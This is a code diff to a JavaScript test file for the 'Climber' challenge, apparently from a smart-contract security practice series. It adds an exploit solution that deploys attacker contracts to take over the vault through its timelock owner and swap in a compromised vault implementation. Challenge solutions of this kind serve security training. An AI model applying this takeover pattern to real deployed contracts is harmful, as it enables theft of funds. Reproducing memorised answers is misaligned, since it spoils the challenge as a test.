@@ -53,6 +53,16 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        let timelockAddress = await this.vault.owner();
+        this.attackClimber = await (await ethers.getContractFactory('AttackClimber', attacker)).deploy(timelockAddress);
+        this.compromisedVault = await (await ethers.getContractFactory('ClimberVaultCompromised', attacker)).deploy();
+        this.attackClimber.attack(
+            this.compromisedVault.address,
+            [timelockAddress, timelockAddress, this.attackClimber.address],
+            [0,0,0],
+            this.vault.address,
+            this.token.address
+        );
     });
 
     after(async function () {
